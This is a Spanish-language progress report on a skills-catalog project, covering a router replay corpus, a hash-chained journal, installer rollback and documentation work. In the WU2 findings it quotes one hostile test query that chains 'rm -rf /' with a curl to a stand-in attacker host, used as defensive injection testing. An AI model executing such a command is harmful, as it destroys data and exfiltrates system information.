# Apply Progress: slice-2

> Fuente de reporte (no de verdad): el estado acumulado de unidades completadas por lote. Lotes completados: WU1 → PR-1 (Fase 1), WU2 → PR-2 (Fase 2), WU3 → PR-3 (Fase 3), WU4 → PR-4 (Fase 4) y WU5 → PR-5 (Fase 5). Desde E3 la fuente de verdad durable es el journal (`journal/snapshot.json`); este archivo es la capa de reporte.

## Estado acumulado

| Fase | Tareas | Estado |
|---|---|---|
| 1 — Media wave + registro (WU1→PR-1) | 1.1–1.7 | ✅ Completas (7/7) |
| 2 — Corpus + replay E2 (WU2→PR-2) | 2.1–2.6 | ✅ Completas (6/6) |
| 3 — Journal apply-progress E3 (WU3→PR-3) | 3.1–3.4 | ✅ Completas (4/4) |
| 4 — Installer lifecycle E4 (WU4→PR-4) | 4.1–4.4 | ✅ Completas (4/4) |
| 5 — Docs E1/E5/E6 + delta hooks (WU5→PR-5) | 5.1–5.6 | ✅ Completas (6/6) |
| 6 — Verificación final | 6.1–6.6 | ⬜ Pendientes |

## Evidencia de unidad de trabajo — WU1 (PR-1)

| Evidencia | Valor |
|---|---|
| Comando de test enfocado y resultado exacto | `node 00-meta-skills/skill-validator/scripts/validate-skills.mjs --strict` → exit 0; «151 pass · 0 with issues, 0 errors · 0 warnings · 0 info» (baseline pre-cambio también exit 0 con 149 pass) |
| Comando/scenario de harness runtime y resultado exacto | Router vivo (`skill-router.mjs --query <q> --json`): «3d scene three.js» → three-js-web ✓; «build a webgl hero with react-three-fiber and drei» → three-js-web ✓; «css 3d transform card flip effect» → visual-effects ✓ (delimitación inversa); regresión fixtures figma-implement / motion-video-pipeline / oklch-theme-injector / ux-auditor-agent → PASS 8/8. Descubrimiento curaduría: «find hover effects inspiration and references», «animate.css library examples», «loading animation spinner ideas for the app» → web-animation-sources primario 3/3; anti-falso-primario «add entrance animation to hero section» → primary micro-interactions + web-animation-sources en secondary/tier1toLoad |
| Límite de rollback | Borrar `05-frontend/three-js-web/` y `05-frontend/web-animation-sources/`; revertir diffs de `SKILLS.md`, `AGENTS.md`, `.atl/skill-registry.md` (o regenerar con `--emit-registry`), `overlap-matrix.json`, `overlap-smoke-tests.json`, `harness-map.md`. No afecta trabajo de PRs 2–5 |

## Evidencia de unidad de trabajo — WU2 (PR-2)

| Evidencia | Valor |
|---|---|
| Comando de test enfocado y resultado exacto | RED (2.1, pre-producción): `node 00-meta-skills/skill-router/scripts/router-replay.mjs` → exit 1 `MODULE_NOT_FOUND` (el caso hostil del corpus no puede pasar sin el replay). GREEN: mismo comando → `{total:13, exactMatches:13, accuracy:1, discrepancies:[], malformedLines:[]}`, exit 0. Test malformada (2.4): corpus temporal con línea rota → `malformedLines:[{line:2,reason:"invalid JSON"},{line:3,reason:"missing non-empty string field 'expectedPrimary'"}]`, exit 1 |
| Comando/scenario de harness runtime y resultado exacto | Replay determinista offline (2.5): 2 corridas a archivos temporales → SHA256 idéntico `D6DBA329…085A`, `Compare-Object` diff vacío; cero llamadas a modelos (spawnSync puro del CLI determinista). Consistencia triple (2.6): `consistency:{groupsInMatrix:8, groupsCovered:8, fixturesMigrated:12}` — three-js-web cubierto en matriz↔fixture↔corpus. Gate PR-2: `validate-skills.mjs --strict` exit 0 («151 pass · 0 with issues»). Smoke directo: «3d scene three.js» → three-js-web; anti-falso-primario «css 3d transform card flip effect» → visual-effects |
| Límite de rollback | Borrar `00-meta-skills/skill-router/references/routing-corpus.jsonl` y `00-meta-skills/skill-router/scripts/router-replay.mjs`. No afecta trabajo de PRs 1 ni 3–5 (matriz/fixture de WU1 quedan intactos) |

## Commits (rama `slice2/pr1-media-wave`, stacked-to-main desde `main` @ 3e1c76a)

| Commit | Unidad | Contenido |
|---|---|---|
| `09d92fb` | D1 + registro parcial + matriz/fixture | three-js-web (SKILL.md + 5 referencias), SKILLS.md/AGENTS.md/registro regen (149→150), grupo unitario overlap-matrix + fixture smoke, harness-map 149→150 |
| `dc4d4b8` | D2 + registro final | web-animation-sources (SKILL.md + animation-sources.md ×10 entradas), índices sincronizados (150→151) |

## Commits (rama `slice2/pr2-router-replay`, stacked-to-main desde `main` @ 493ba0d)

| Commit | Unidad | Contenido |
|---|---|---|
| (ver git log) | D5 corpus + replay + consistencia triple | `routing-corpus.jsonl` (12 casos migrados del fixture + three-js-web + caso RED de metacaracteres) y `router-replay.mjs` (spawnSync sin shell:true, timeout, métricas estables) |
| (ver git log) | Marcas SDD Fase 2 | tasks.md [x] 2.1–2.6 + apply-progress merge |

## Evidencia de unidad de trabajo — WU3 (PR-3)

| Evidencia | Valor |
|---|---|
| Comando de test enfocado y resultado exacto | Arnés en temp dir (`%TEMP%\opencode\slice2-pr3-test.mjs`, 7 grupos → `ALL GROUPS PASSED (7)`): T1 registro básico (snapshot v1 + JSONL con cadena de hashes) · T2 idempotencia (re-record → snapshot byte-idéntico, cero evento efectivo) · T3 lock exclusivo (escritor concurrente exit 3 controlado sin tocar el lock ajeno; huérfano retrodatado >stale-timeout recuperado, stderr «recovering orphan lock») · T4a abort simulado (cola truncada sin `\n` descartada → `interrupted-retry` → reintento legal aplicado; unidades confirmadas preservadas; post-reparación `verify` exit 0) · T4b evento commitido + snapshot rancio → replay restaura sin pérdida · T5 historial mutado rechazado exit 4 («append-only history must not be edited») · T6 `report`/`status --json` derivados del snapshot con orden numérico de unidades |
| Comando/scenario de harness runtime y resultado exacto | Piloto en vivo sobre el change real: `record --change slice-2 --unit 3.1…3.4` → 4 eventos seq 1–4, exit 0 cada uno ANTES de marcar `[x]`; `verify --change slice-2` → `{ok:true,lastSeq:4,units:4}` exit 0; idempotencia re-ejecutada sobre el change (`applied:false,"already-completed"`, lastSeq intacto); `report` deriva la tabla consolidada desde el snapshot |
| Límite de rollback | Restaurar `00-meta-skills/sdd-apply/SKILL.md`; borrar `00-meta-skills/sdd-apply/scripts/apply-journal.mjs` y `openspec/changes/slice-2/journal/`. No afecta trabajo de PRs 1–2 ni 4–5 |

## Commits (rama `slice2/pr3-apply-journal`, stacked-to-main desde `main` @ 104a0e4)

| Commit | Unidad | Contenido |
|---|---|---|
| `5758709` | D6 journal | `sdd-apply/scripts/apply-journal.mjs` (módulo+CLI): snapshot versionado, events.jsonl append-only con hash encadenado sobre bytes crudos, lock `wx`+PID con recuperación de huérfanos, IDs idempotentes, recuperación de escritura interrumpida, subcomandos record/status/report/verify |
| `a733c01` | Integración E3 | `SKILL.md` Pasos 5–6: evento ANTES de `[x]`; apply-progress DERIVADO del snapshot; protocolo de merge reclasificado como capa de reporte |
| (este commit) | Marcas SDD Fase 3 | tasks.md `[x]` 3.1–3.4 + apply-progress merge + journal del piloto en vivo |

## Evidencia de unidad de trabajo — WU4 (PR-4)

| Evidencia | Valor |
|---|---|
| Comando de test enfocado y resultado exacto | RED (4.1, pre-producción): arnés `%TEMP%\opencode\slice2-pr4-installer-test.mjs` contra el instalador actual → exit 1 con fallos genuinos: `G1 manifest exists FAIL` (no hay manifest), `G1 foreign file survived install FAIL` (el `rmSync` wholesale del install destruye archivos ajenos del usuario en cada corrida — la amenaza destructiva de la matriz), `G2 dry-run reports overwrites FAIL`, G3 ni ejecutado (`--uninstall` inexistente → exit 2). GREEN (post-implementación): mismo arnés → `ALL GROUPS PASSED` 33/33 checks, exit 0: ajeno plantado sobrevive al uninstall y sale listado como retenido; propio editado retenido; uninstall sin manifest aborta exit 1 sin borrar nada |
| Comando/scenario de harness runtime y resultado exacto | Ciclo completo en temp dirs (g1/g2/g3/g4/g4b/g4c), Node puro sin Bash: manifest `{version:1, generation:1, ts, tool:"claude-code", mode:"copy", entries:[{dest,src,sha256,prevState}]}` con sha256 verificado contra disco y USER-NOTES.md ajeno excluido del ownership; dry-run 2ª generación emite plan create/overwrite por archivo con snapshot de `.claude` byte-idéntico y generación intacta; uninstall borra solo entries con hash vigente (`_shared/` eliminado completo) y retiene/lista FOREIGN.md + SKILL.md editado; rollback gen2→gen1 restaura contenido previo desde backup (`prevSha256`+`prevBackup`) o elimina archivos new, history registra `{type:"rollback",...}` y el manifest vuelve a la vista de generación 1; rollback de generación all-new elimina sus archivos; gate PR-4: `validate-skills.mjs --strict` → exit 0 («151 pass · 0 with issues») |
| Límite de rollback | Revertir el diff de `00-meta-skills/skill-sync/scripts/install-skills.mjs` (un commit). Los manifests/backups creados durante pruebas viven solo en temp dirs. No afecta trabajo de PRs 1–3 ni 5 |

## Commits (rama `slice2/pr4-installer-lifecycle`, stacked-to-main desde `main` @ a1b501c)

| Commit | Unidad | Contenido |
|---|---|---|
| `d2ad4a9` | D7 installer lifecycle | Manifest por generación (`.skills-install/manifest.json`) con backups de sobrescritura; copy file-by-file sin borrado wholesale; `--dry-run` plan completo no mutante; `--uninstall` solo-propios con retención listada y abort sin manifest; `--rollback` de última generación con registro en historial; symlinks como entries de link sin borrar directorios reales |
| (este commit) | Marcas SDD Fase 4 | tasks.md `[x]` 4.1–4.4 + apply-progress merge + journal seq 5–8 |

## Evidencia de unidad de trabajo — WU5 (PR-5)

| Evidencia | Valor |
|---|---|
| Comando de test enfocado y resultado exacto | Gate doc-only (5.6): `node 00-meta-skills/skill-validator/scripts/validate-skills.mjs --strict` → exit 0, «151 pass · 0 with issues, 0 errors · 0 warnings · 0 info». Verificación 5.2: mini-validador del subset JSON Schema empleado por `profiles.schema.json` (`$ref`/`$defs`, `type`, `const`, `required`, `additionalProperties:false`, `minLength`) sobre `profiles.example.json` → VALID exit 0; instancia corrupta deliberada (sin `version`, propiedad adicional `bogus`, alias vacío) → INVALID con 3 errores precisos, exit 1. Verificación 5.1: Select-String con patrones de comandos runtime (`.mjs`, `node `, `npm`, `npx`, `curl`, invocaciones estilo CLI) sobre `model-routing.md` → 0 coincidencias; «TUI» aparece solo en contexto «sin TUI obligatoria» (3 menciones). Cross-check textual 5.4: vocabulario causal compartido (`introducido`/`empeorado`/`follow-up`/`opt-in`/`causal`) presente en harness-map y review-policy.md |
| Comando/scenario de harness runtime y resultado exacto | Smoke router: `skill-router.mjs --query "3d scene three.js" --json` → `{primary:"three-js-web", confidence:1}`, exit 0. Replay determinista ×2: `router-replay.mjs` dos corridas → `REPLAY_IDENTICAL` (Compare-Object vacío), `{total:13, exactMatches:13, accuracy:1, discrepancies:[], malformedLines:[]}`, consistencia triple 8/8 grupos + 12/12 fixtures. Cero carpetas de skill nuevas: `git diff --name-status main...HEAD` = `.gitattributes` + 4 docs; SKILL.md nuevos: 0; conteo total: 151 |
| Límite de rollback | Revertir los diffs de: `.gitattributes`, `00-meta-skills/skill-router/SKILL.md` (+ regenerar tier0-context/registro), `00-meta-skills/sdd-orchestrator/references/model-routing.md`, `_shared/model-routing/`, secciones nuevas de `00-meta-skills/harness-map.md` y `02-dev-roles/code-reviewer/references/review-policy.md`. No afecta código ejecutable (PR-5 es doc-only) ni el trabajo de PRs 1–4 |

## Commits (rama `slice2/pr5-docs-deltas`, stacked-to-main desde `main` @ 9e17188)

| Commit | Unidad | Contenido |
|---|---|---|
| `3e594a5` | FIX cross-cutting 1 | `.gitattributes` con `openspec/**/journal/** -text`: git trata el journal como binario opaco y nunca reescribe sus EOL (protege la cadena hash del journal frente a `core.autocrlf=true`; riesgo latente documentado en WU4). Incluyó reparación previa de bytes CRLF→LF del working tree (reproducía «hash chain broken at events.jsonl:2» tras el merge de PR-4) + renormalización del índice |
| `87ecae9` | FIX heredado PR-1 | Contadores residuales «149»→«151»: `skill-router/SKILL.md` (frontmatter description + cuerpo ×2) + regeneración de derivados (`tier0-context.json/md` vía `--emit-tier0`, `.atl/skill-registry.md` vía `--emit-registry`). V exit 0 tras el cambio |
| `2dfb7f3` | E1 (5.1+5.2) | `sdd-orchestrator/references/model-routing.md` (interfaz `list()`/`resolve(phase)`, formato declarativo, algoritmo del agente, degradación sin catálogo) + `_shared/model-routing/profiles.{schema,example}.json` (6 fases; example VALID contra schema) |
| `b57f1b1` | E5 (5.3+5.4) | harness-map: sección «⚖️ Política de review» (causalidad + perfiles opt-in) y Model Routing actualizado de «diferido» a «activo desde Slice 2» (delta hooks); `code-reviewer/references/review-policy.md` como reflejo SHOULD |
| `b5d5618` | Marcas SDD Fase 5 (parcial) | tasks.md `[x]` 5.1–5.6 + apply-progress merge + journal seq 9–14 |
| (este commit) | E6 (5.5) | harness-map: sección «🔬 Punto de extensión AHE» junto al RDD (sidecars + 4 niveles de evidencia, doc-only, OPEN-1 diferido); corrección del ledger de commits de este archivo |

## Decisiones y hallazgos de implementación

### WU5 (PR-5)
- **FIX 1 materializó su amenaza antes de empezar**: al abrir la fase, el journal reportaba «hash chain broken at events.jsonl:2» — `core.autocrlf=true` había reescrito LF→CRLF en events.jsonl/snapshot.json durante el merge de PR-4 a main (mismo gotcha de WU4, ahora en el flujo normal merge/checkout). Reparación: restaurar bytes exactos de HEAD vía `git show` + write buffer Node, luego `.gitattributes` `-text` para `openspec/**/journal/**` + `git add --renormalize`. Tras el fix, `verify` ok y el riesgo queda cerrado estructuralmente.
- **Gotcha de renormalización**: al añadir `-text`, git dejó de limpiar EOL al comparar y los journal files aparecían como modificados aunque `git diff` estuviera vacío (stat-cache + transición de atributos); `git add --renormalize <path>` lo resuelve sin producir diff.
- **Schema sin dependencias**: no hay node_modules en el catálogo, así que la validación example↔schema se hizo con un mini-validador autónomo que cubre exactamente las keywords que emplea el schema; se verificó también el camino negativo (instancia corrupta → INVALID exit 1). El schema usa objeto vacío `{}` como «fase hereda defaultAlias», evitando `oneOf` innecesario.
- **Perfiles ejemplo alineados con la convención del kit**: `opus` para propose/design y `sonnet` para el resto — ilustrativos; los alias solo cobran significado contra el catálogo del runtime (`resolve(phase)`).
- **Alcance respetado**: `openspec/config.yaml` aún dice «catálogo de 149 skills» — residual detectado FUERA del alcance autorizado de este fix (solo skill-router + tier0); queda anotado como follow-up para verificación final o mantenimiento.
- **Presupuesto**: PR-5 doc-only ≈ 300 líneas cambiadas (dentro de la estimación 300–520).

### WU4 (PR-4)
- **RED confirmó la amenaza real**: el instalador preexistente ejecutaba `rmSync(recursive)` del directorio destino antes de copiar — cada re-instalación DESTRUYA silenciosamente archivos del usuario dentro de skills instaladas (ajenos o editados). El nuevo flujo copy es file-by-file y nunca borra wholesale: los ajenos sobreviven y jamás entran al manifest.
- **Backups para rollback**: restaurar `prevState:"overwritten"` exige el contenido previo, no solo su hash; se respalda en `.skills-install/backups/g{N}/{idx}-{basename}` y el entry referencia `prevBackup`. El backup consumido se borra tras restaurar. Campos aditivos sobre la forma literal de 4.2 (`prevBackup`, `kind:"symlink"`).
- **Ownership acumulativo**: uninstall opera sobre TODAS las generaciones (`entries` vigentes + `previousGenerations[]`), deduplicado por `dest` con último registro ganador; así un archivo instalado en gen1 sigue siendo propio aunque gen2 no lo haya tocado. Rollback en cambio usa SOLO la última generación y hace pop hacia la vista anterior.
- **Seguridad simétrica en rollback**: igual que uninstall, solo toca archivos cuyo sha256 vigente coincide con lo instalado; un archivo propio editado después de la instalación se RETIENE (no se puede descartar intención del usuario). Desviación menor documentada: A8 decía «restaura prevSha» sin condicional; el escenario de spec («archivos propios vuelven al estado previo») se cumple para archivos intactos.
- **Symlink mode**: los links/junctions se registran como entries `kind:"symlink"` (sha256 null); uninstall/borrar-link no atraviesa el target. Cambio de comportamiento heredado documentado: instalar symlink sobre un directorio REAL existente ahora se omite con advertencia (antes lo borraba recursivamente) — pedir `--uninstall` primero.
- **Presupuesto**: 420 líneas cambiadas (+383/−37), sobre la estimación 200–320 pero bajo el techo vigente del proyecto (`review_budget_lines` = 800/PR). El excedente viene de backups de sobrescritura, poda de directorios vacíos post-uninstall y rutas seguras para symlink.
- **Journal CRLF gotcha (hallazgo cross-cutting)**: `core.autocrlf=true` reescribió LF→CRLF en `journal/events.jsonl` al mergear PR-3; el journal hashea bytes crudos por línea → «hash chain broken at events.jsonl:2». Reparación aplicada antes de registrar Fase 4: restaurar los bytes exactos de HEAD (LF) vía `git show` + write buffer — valida nuevamente (`verify` ok). Riesgo latente: cualquier checkout/filtro futuro puede reintroducirlo; mitigación sugerida fuera de este slice: entrada `.gitattributes` (`openspec/**/journal/** -text`). También se eliminó una fila duplicada de Fase 3 en la tabla de Estado acumulado (artefacto de merge previo).


### WU3 (PR-3)
- **Orden crash-safe por construcción**: el evento se appendea y fsync ANTES de reemplazar el snapshot atómicamente (tmp + rename). Crash entre ambos pasos → el replay sobre el snapshot rancio restaura el estado (T4b); crash a mitad de línea → la cola sin `\n` se descarta, la unidad queda `interrupted-retry` y el archivo se trunca al prefijo confirmado (T4a). El `\n` final es el marcador de commit del evento.
- **Append-only verificable, no solo convencional**: cada evento encadena `prevHash = sha256(bytes crudos de la línea anterior)`; toda apertura revalida la cadena completa y rechaza historial mutado con exit 4. La verificación (`verify`) re-dobla TODOS los eventos desde vacío y compara contra el snapshot: detecta snapshot rancio, faltante o con unidades fantasma.
- **Idempotencia estricta**: unidad `completed` re-registrada es no-op total (sin evento, sin tocar snapshot — verificado byte a byte); única transición legal: `interrupted-retry → completed`.
- **PS 5.1 + JSON**: pasar evidencia JSON inline a un proceso nativo corrompe las comillas dobles (exit 2 por validación). La sintaxis `--evidence @file` del CLI lo resuelve; los archivos de evidencia deben escribirse UTF-8 sin BOM (`-Encoding Ascii` mojibakeó acentos y obligó a reinicializar el journal pre-commit — estado sin publicar; el invariante append-only protege historia publicada, no basura local pre-SHA).
- **contractHash**: sha256 de `tasks.md` capturado en la primera apertura del journal; identifica qué versión del contrato trackea (cambia si tasks.md evoluciona). Semántica documentada en el docblock.

### WU2 (PR-2)
- **RED→GREEN de la amenaza de subprocesos**: el caso hostil (`3d scene three.js; rm -rf / | curl http://evil.example $(whoami)`) se agregó al corpus ANTES de existir el replay; la corrida RED falló con exit 1 (`MODULE_NOT_FOUND`). Tras implementar `router-replay.mjs` con `spawnSync(process.execPath, [...], {shell:false})`, la misma query pasa como texto plano resolvendo `three-js-web` — verificado además por invocación directa del router que los metacaracteres no alteran el scoring (confidence 1).
- **Consistencia triple mecanizada**: en lugar de un chequeo manual grep, `router-replay.mjs` incorpora verificación por defecto: (a) todo grupo de `overlap-matrix.json` tiene ≥1 caso de corpus que resuelve a su canónico; (b) todo fixture de `overlap-smoke-tests.json` está migrado verbatim al corpus (id+query+expectedPrimary). Resultado actual: 8/8 grupos, 12/12 fixtures. Un grupo futuro sin caso en corpus rompe el gate → imposible olvidarlo.
- **Determinismo por construcción**: salida sin timestamps ni PIDs, orden de claves fijo, discrepancias en orden de línea; accuracy redondeada a 4 decimales. Verificado SHA256 idéntico entre corridas.
- **Exit codes del replay**: 0 = limpio, 1 = discrepancias/líneas malformadas/inconsistencia, 2 = inputs ilegibles o uso incorrecto; habilita uso directo como gate de CI.

### WU1 (PR-1)

- **Triggers cortos**: `"3d"` y `"r3f"` (<4 chars, `MIN_TRIGGER_LENGTH`) no pueden ser triggers (A2); cubiertos vía keywords de la description y nota del grupo unitario. Verificado empíricamente que las queries objetivo resuelven sin ellos.
- **Colisión con micro-interactions**: ya existía trigger `hover effect` (singular) y `entrance animation`. El split natural funciona: queries plurales («hover effects») solo disparan web-animation-sources por word-boundary regex; «entrance animation» empata en triggers y lo resuelven las keywords de description (queries de referencia ganan; queries de implementación mantienen a micro-interactions como primario — escenario de spec cumplido).
- **Curaduría de URLs (desviación menor documentada)**: los artefactos del cambio traían título+autor de las 10 referencias pero ninguna URL. Se verificaron por búsqueda: Tim Quirino (timq.xyz, portafolio 3D con Spline), Animate.css (animate.style), AniJS (anijs.github.io, autor Dariel Noel — interpretación de la entrada «Animajs.css»), Reactbits.dev. Las fuentes no ubicables públicamente (Unifiers of Japan, Coding for Designers, Tellet, Ozone, Yuna, Gitbook) se curaron con enlace sustituto canónico del mismo tópico, marcado como tal en cada entrada: Codrops HoverEffectIdeas, Webflow loading-animation, AOS, microinteractions.com (Dan Saffer), FreeFrontend background effects, Codrops Custom Cursor Effects (Stefan Kaltenegger).
- **Registro atómico por commit**: cada commit deja el repo verde bajo `--strict` (registro incluido en el mismo commit que su skill), mejorando bisectabilidad dentro del PR.
- **Presupuesto**: ~410 líneas cambiadas en los 2 commits de skills (299+109+4 del) + ~15 en tasks/progress; muy por debajo del techo de 800 — sin necesidad de recortar facetas.

## Desviaciones del diseño

Ninguna estructural. Notas documentadas: sustitución de enlaces curados (WU1); verificación de consistencia triple embebida en el replay (WU2), habilitada por el delta overlap-matrix; en WU3, tres adiciones menores no explicitadas en A7 pero habilitadas por los escenarios del delta apply-progress-journal — subcomando `verify` (escenario «Mutación prohibida»: chequeo sin reparación), override `--journal-dir` (aislamiento para el escenario «simular abort en temp dir» sin tocar el árbol real) y evento `unit-interrupted` que deja la interrupción visible en el historial (escenario «Recuperación tras abort»: trazabilidad del reintento). La implementación coincide con A7/D6: snapshot versionado, JSONL append-only con `\n` final como marcador de commit, lock exclusivo con recuperación de huérfanos, IDs idempotentes y Node puro Windows-first sin Bash.
